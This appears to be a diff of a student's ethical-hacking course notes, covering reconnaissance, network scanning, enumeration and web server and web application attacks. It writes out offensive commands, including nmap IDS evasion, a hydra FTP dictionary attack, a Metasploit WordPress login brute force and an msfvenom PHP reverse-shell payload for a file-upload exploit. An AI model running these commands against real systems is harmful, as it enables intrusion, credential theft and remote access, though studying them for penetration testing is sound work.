@@ -1,95 +1,106 @@
 Module 2 -Footprinting and Reconnaissance pag 4
 —————————————
 	1 Search Engines
-			Google Hacking
-			Video search engines
-			FTP Search
-			IoT Search
+		Google Hacking
+		Video search engines
+		FTP Search
+		IoT Search
+			shodan
 	2 Web Services
-			Netcraft
-			People
-			Email List Harvester
-			Dark web
-			OS footprinting
+		1 Netcraft online
+		2 People online
+		3 Email List Harvester
+			root#theHarvester -d target -l 200 -b google.com 		(-d taget, -l number of result -b source )
+		
+		4 Dark web (Tor_Browser)
+		5 OS footprinting
+			Consys web service online
+			
 	3 Social Networking sites
-			Linkedin Harvester
-			Personal Info Sherlock
-			Followerwonk
+		1 Linkedin Harvester
+			root# theHarvester -d Target -l 200 -b linkedin
+		2 Personal Info Sherlock
+			root# git clone https://github.com/sherlock-project/sherlock.git
+			root# cd sherlock
+			root# pip3 install
+			root# python3 -m pip intall -r requirements.txt
+			root# python3 sherlock.py staya nadella
+			
+		3 Followerwonk online
 	4 Website
-			Ping commandline
-			Website Informer
-			Web Data Extractor
-			HTTrack copier
-			CeWL wordlists
+		1 Ping commandline
+		2 Website Informer online
+		Web Data Extractor
+		HTTrack copier
+		CeWL wordlists
 	5 Email Footprinting
-			eMailTrackerPro
+		eMailTrackerPro
 	6 Whois Footprinting
-			Lookup Domain tools
+		Lookup Domain tools
 	7 DNS footprint
-			nslookup cmdline
-			Reverse IP DNS recon
+		nslookup cmdline
+		Reverse IP DNS recon
 	8 Network FootPrinting
-			Network range			
-			Tracerouting
-			Path Analyzer pro
+		Network range			
+		Tracerouting
+		Path Analyzer pro
 	9 Various tools
-			Recon-ng
-			Maltego
-			OSRFramework
-			FOCA
-			BillCipher
-			OSINT Framework
+		Recon-ng
+		Maltego
+		OSRFramework
+		FOCA
+		BillCipher
+		OSINT Framework
 			
 Module 3 -Scanning Networks pag 183
 —————————————
 identify hosts, ports and services.
 Tools
 	1 Host Discovery 
-				1Nmap (ZenMap)	
+		1 Nmap (ZenMap)	
 						
-					-sn desable Port scan 
-						-PR ( ARP scan)
-						-PE  ICMP ECHO (Group Target)
-						while ICMP ping is Blocked use:
-							-PP
-							-PM
-							-PS
-							-PA
-							-PO
+			-sn desable Port scan 
+			-PR ( ARP scan)
+			-PE  ICMP ECHO (Group Target)
+				while ICMP ping is Blocked use:
+					-PP
+					-PM
+					-PS
+					-PA
+					-PO
 							
-				2 Angry IP Scanner (From Windows 10)
-						Range or Unique. Follow steps				
+		2 Angry IP Scanner (From Windows 10)
+			Range or Unique. Follow steps				
 	2 Port and Services Discovery
-						1 MegaPing
-							Range IP	Select IP scanner —> From to —> Start- Show result
-							Specific IP Select IP
+		1 MegaPing (windows tool)
+			Range IP Select IP scanner —> From to —> Start- Show result
+													
+		2 NetScan Tools Pro
+			Manual tools —> ping scanner (give a range IP)
+			Port scanner —> IP Target —> scan range of ports
+						
+		3 Nmap (ZenMap)
+			-sT: TCP connect/full open scan
+			-v: 					Verbose output
+			-sS: 					Stealth scan/TCP hall-open scan — tcp 3 hands shakes
+			-sX: 					Xmax scan (filtered ports)  — firewall has (FIN URG, PUSH flags)
+			-sM: 					TCP Maimon scan (FIN/ACK open Port if RST Port is closed
+			-sA: 					ACK flag probe scan 
+						
+				with firewall ON
+					   -sU: 				UDP scan 
+					   -sI:					IDLE/IPID Header scan (used to spoofed source ip to discover services 
+					   -sY: 				SCTP INIT Scan
+					   -sZ: 				SCTP COOKIE ECHO Scan
+					   -sV: 				Detect service versions
+					   -A: 					Aggressive scan
+						
+		4 HPing3
 							
-						2 NetScan Tools Pro
-							Manual tools —> ping scanner (give a range IP)
-							Port scanner —> IP Target —> scan range of ports
-						
-						3 Nmap (ZenMap)
-							-sT: TCP connect/full open scan
-					     -v: Verbose output
-					    -sS: Stealth scan/TCP hall-open scan — tcp 3 hands shakes
-					    -sX: Xmax scan (filtered ports)  — firewall has (FIN URG, PUSH flags)
-					    -sM: TCP Maimon scan (FIN/ACK open Port if RST Port is closed
-					    -sA: ACK flag probe scan 
-						
-						with firewall ON
-					    -sU: UDP scan 
-					    -sI: IDLE/IPID Header scan (used to spoofed source ip to discover services 
-					    -sY: SCTP INIT Scan
-					   -sZ: SCTP COOKIE ECHO Scan
-					   -sV: Detect service versions
-					   -A: Aggressive scan
-						
-						4 HPing3
-							
-							hping3 -A IP -p -c 5 where A= Ack flag -p= port -c numero Packet to send
-							hping3 -8 0-100 -S IP target -V where -8=scan mode  0-100= specify ports to be scanned -V= verbose
-							hping3 -F -P -U IP-target -p 80 -c 3 F= FIN flag -P push flag -U Urg g+flag -c Number packet
-							hping3 —scan 0-100 -S IP-target where —scan = port range to scan -S SYN flag
+			hping3 -A IP -p -c 5 where A= Ack flag -p= port -c numero Packet to send
+			hping3 -8 0-100 -S IP target -V where -8=scan mode  0-100= specify ports to be scanned -V= verbose
+			hping3 -F -P -U IP-target -p 80 -c 3 F= FIN flag -P push flag -U Urg g+flag -c Number packet
+			hping3 —scan 0-100 -S IP-target where —scan = port range to scan -S SYN flag
 							
 	3 OS Discovery/Banner grabbing
 				TTL(WireShark) —> 64 linux —> 32 win 95 —>128 win 7,8,10,11 —> 255 iOS —> 255 Solaris 
@@ -101,12 +112,12 @@ Tools
 					unicornscan IP-target -Iv
 	
 	4 IDS and Firewall
-				Evasion Techniques
-					nmap -f IP-target where -f split (divide) IP packet into tiny fragmentos packets
-					map -g 80 IP-target where -g 80 port runing firewall
-					nmap -D RND:10 IP-target where -D deco scan RND: generate a random and non-reserves IP
+		Evasion Techniques
+			nmap -f IP-target where -f split (divide) IP packet into tiny fragmentos packets
+			map -g 80 IP-target where -g 80 port runing firewall
+			nmap -D RND:10 IP-target where -D deco scan RND: generate a random and non-reserves IP
 
-				Colasoft (Packets IDS/Firewall)
+			Colasoft (Packets IDS/Firewall)
 					———————————--
 				HPing3 (UDP/TCP) IDS/Firewall
 					hping3 IP-target —Rand-source —data 500
@@ -127,22 +138,22 @@ Tools
 					
 	
 	5 Network Topology Mapper
-				SolarWinds
+		SolarWinds
 	
 	6 Various Scanning tools 
-				Metasploit
-				service pestgresql Start
-				msfdb init 
-				Msfconsole
-				db_status
-				nmap -Pn -sS -A -oX (namefile) RangeIP/24 whole subnet range/24 for active hosts 5 min or more
-				db_import (namefile)
-				db_services
-			Search portscan —> use auxiliar/scanner/portscan/syn                    (open ports)
-							use auxiliar/scanner/porscan/tcp                      (open ports)
-							use auxiliar/scanner/smb/smb_version             (OS discovery)
-							use auxiliar/scanner/ftp/ftp_version.                  (Ftp Version)
-				hosts -o /root/Desktop/Metasploit_Scan_result.csv                    (Export results csv)
+		Metasploit
+			service pestgresql Start
+			msfdb init 
+			Msfconsole
+			db_status
+			nmap -Pn -sS -A -oX (namefile) RangeIP/24 whole subnet range/24 for active hosts 5 min or more
+			db_import (namefile)
+			db_services
+			Search portscan —> use auxiliar/scanner/portscan/syn                 		(open ports)
+							use auxiliar/scanner/porscan/tcp                (open ports)
+							use auxiliar/scanner/smb/smb_version            (OS discovery)
+							use auxiliar/scanner/ftp/ftp_version.           (Ftp Version)
+				hosts -o /root/Desktop/Metasploit_Scan_result.csv                   	(Export results csv)
 
 
 Module 4 -Enumeration pag 320 book
@@ -150,46 +161,69 @@ Module 4 -Enumeration pag 320 book
 Process of extracting sensitive info, username, machine names, network resources, share and services, policies etc..
 
 	1 NetBIOS Enumeration
-			in win Cmdline
-				nbtstat -a IP-target where -a display table name
-				nbtstat -c display list contents of NetBIOS in cache
-			NetBIOS Enumerator (Win10)
-				following steps
-			NSE Script
-				map -sV -v —script nbstat.nse IP-target
-				nmap -sV -p 137 —script.nbstat.nse IP-target
+		1 Window_CMD
+			nbtstat -a IP-target 					(-a  netbios table)
+			nbtstat -c Target					(display list contents of NetBIOS in cache)
+			net use							(display info connections status, folder shares, drives, net_info)
+		2 NetBIOS Enumerator (windows_tool)
+			scanner
+		
+		3 NSE Script
+			nmap -sV -v --script nbstat.nse IP-target
+			nmap -sU -p 137 --script.nbstat.nse IP-target
 	2 SNMP enum (hosts, routers, resources, shares, routers)
-			snmp-check
-				nmap -sU -p 161 IP-target
-				snmp-check IP-target ( full System info and usernames, process, folder shares, disk Storage)
-			softperfect
-				following steps
+		1 snmp-check
+		root# nmap -sU -p 161 IP-target
+		root# snmp-check IP-target 			(full System info and usernames, process, folder shares, disk Storage)
+		
+		2 softperfect (windows tool)
+			
 	3 LDAP enum
-			AD explorer LDAP (usernames, addr, depart details, server names)
-				following step
-	4 NFS enum
-			RPCScan Wind 10 and SuperEnum (Linux)
+		1 AD explorer LDAP(windows_Tool) - usernames, addr, depart details, server names
+			
+	4 NFS enum (check list client connected to AD and shared data)
+		1 root# nmap -p 2049 target					(check open nft)
+		  root# gitclone https://github.com/p4pentest/SuperEnum
+		  root# cd SuperEnum
+		  root# echo "Target_IP >> Target.txt				(Insert target IP or IPs to check)
+		  root# chmod +x superenum
+		  root# ./SuperEnum 	Enter Target
+		  
+		  								Check network comunication interface
+		  root# git clone https://github.com/hegusung/RPCScan
+		  root# cd RPCScan
+		  root# python3 rpc-scan.py target --rpc
+		  		  
 	5 DNS Enum
-			Zone Transfer 
-				dig ns IP Target
-				dig @subdomain IP Target
-				nslookup
-					ls -d subdomain
-				DNSSEC Zone (parot)
-					dnsrecon -d specifies Domain -z specifies Zone (dnsrecon -d IPTarget -z)
+		1 Zone Transfer 
+			dig ns IP Target
+			dig @subdomain IP Target
+			nslookup
+				ls -d subdomain
+		2 DNSSEC Zone (parot)
+				dnsrecon -d specifies Domain -z specifies Zone (dnsrecon -d IPTarget -z)
 	6 RPC, SMB, FTP enum
-			RPC endpoint enable vuln services
-			SMB services banir grabbing
-			FTP bruteforce and packet sniffing
-
-				NetScanTools Pro(Wind)		
-				nmap -T4 -A IP Target
+		RPC 			(check endpoints enable vuln services ports)
+		1 NetscanTool Pro (windows_tool) choose rpdc info
+						choose smb scanner
+						
+		2 SMB services banir grabbing
+		root# nmap -T4 -A IP
+		root# nmap -p 445 -A IP
+		
+		3 FTP bruteforce and packet sniffing
+		root# nmap -p 21 -A IP
+		
 	7 Various tools
-			Global Inventory(win)
-			Advanced IP Scanner
-			Enum4linux
-
-
+		Global Inventory(win)
+		Advanced IP Scanner (windpw_tool)
+		Enum4linux
+			root# enum4linux -U user_name -p password -n Target  	(enum netBIOS)
+			root# enum4linux -u user_name -p password -o Target	(Enum OS info)
+			root# enum4linux -u user_name -p password -P target	(enum Passwd policy)
+			root# enum4linux -u user_name -p password -G target	(Group Info)
+			root# enum4linux -u user_name -p password -S target	(Share info)
+			
 Module 5 - Vulnerabilty Analysis 413
 ————————————————
 Vuln Assessment scan networks for known Security weakness
@@ -610,15 +644,110 @@ Module 12- Evading IDS, Firewall, Honeypots
 		2 Bypass FW rules using HTTP/FTP Tunneling
 		
 
-
 Module 13 - Web Hacking 
 -----------------------
-
-
+	LAB 1 Footprint Web Server
+		1 using Ghost Eye (Linux_CMD)
+		
+			root# Python3 ghost eye (options 1 whois lookup, options 2 DNS, options 6 clickjacking)
+				
+		2 using Skipfish (Linux_CMD)
+			Target(Wordpress) 
+			root#skipfish -o /root/test -5 /usr/share/skipfish/dictionaries/complete.wl http://target
+			
+		3 Using httprecon Tool (windows)
+		4 using ID Server (windows)
+		5 using NetCat and Teelnet (Linux_CMD) banner grabbing
+			root# nc -vv target 80
+			root# telnet target 80
+			
+		6 using Nmap Script Engine (NSE)
+			root# nmap -sV --script=http-enum target    						enumerate webpage
+			root# nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- Target 	(Discover hostnames)
+			root# nmap --script htt-trace -d target 						Vulnerabity in TRACE
+			root# nmap -p80 --script http-waf-detect target 					Detect firewall on webPage
+					
+		7 using Uniscan (Linux_CMD)
+			root# uniscan -u http://target -q      (-q directories)					enumerate directories
+			root# uniscan -u hhtp://target -we.    (-we robots.txt and sitemap)
+			root# uniscan -u http://target -d      (-d dynamic testing)				emails-IDs extra hosts, pge info, OS. ...
+		
+	LAB 2 Web Attack
+		Crack FTP using a Dictionary Attack
+			root# nmap -p21 target					Scan FTP is open
+			root# ftp target
+			root#hidra -L /root/root/wordlist/Usernames.txt -P /root/Wordlist.txt ftp://Target 	(-L check username -P check password) 
 
 Module 14 - Web Application 
 ---------------------------
-
+	LAB 1 Footpring web App
+		1 Recon
+			online tools like (netcraft, smartwhois, batch ip converter, dnsstuff)
+			root# nmap -T4 -A -v target		(-T4 time template)
+			root# telnet target 80 			(OS banner grabbing)
+			
+		2 using whatweb
+			root# whatweb -v target
+			root# whatweb --log -log-verbose=MovieScope_Report target		(result on root folder)
+			root# pluma MovieScope_Report						(open result privioused)
+			
+		3 using OWASP ZAP
+			from Parrot
+			root# zaproxy
+			
+		4 Load Balancers using various tools
+			root# dig target
+			
+		5 identify web Server Directories
+			root# nmap -sV --script=http-enum target  			(enum_apps,dir,files)
+			gobuster dir -u taget -w /root/Desktop/comom.txt		(dir file brute force -u url, -w wordlist)
+			
+		6 Scanning using Vegas (windows)
+		
+		7 Identify Clickjacking Vuln using iframe
+			create a file on notepad PAG 1304
+	
+	LAB 2 Web App Attack
+		1 using Brute force - Burp Suite
+			Check pag 1309  			resource Tryhackme rooms
+			
+		2 tampering using Burp Suite
+			Check pag 1309				Resource tryhackme rooms
+			
+		3 Exploit tampering and XSS
+			check pag 1336 
+		4 Cross-site Request Forgery CSRF
+			Check pag 1342
+			
+		5 Enum and attack using WPScan and Metasploit
+			root# wpscan --api-token <API> TOKEN --uri target:8080 -enumerate u	(--enumerate u user)
+			root# msfconsole
+					use auxiliary/scanner/http/wordpress_login_enum 		(dictionary attack using file.txt)
+					show options
+					set Pass_file location file.txt
+					set username..
+					set ...
+					set ...
+					run
+			
+		6 exploit RCE vul web Server
+				extract info aboutmachine, create account, assign privilege
+			pag 1366 - 1382
+			
+		7 exploit a File Upload Vul different Levels
+				root# msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_local LPORT=4444 -f raw 		(copy all raw payload generated)
+				root# pluma upload.php									(paste on edit text)
+				find place on target to upload
+				root# msfconsole
+						use exploit/multi/handler
+						set ...
+						set ...
+						continue on pag 1390
+						
+		8 Gain Backdoor Access via Web Shell using Weevely
+			
+	LAB 3 Detect using tools
+		1 using N-Stalker web App Sec Scanner (windows)
 
 
 Module 15 - SQL Injection 
@@ -639,7 +768,7 @@ Module 19 - Cloud computing
 ----------------------------
 
 
-Module 11- Cryptography 
+Module 20- Cryptography 
 -----------------------
 
 
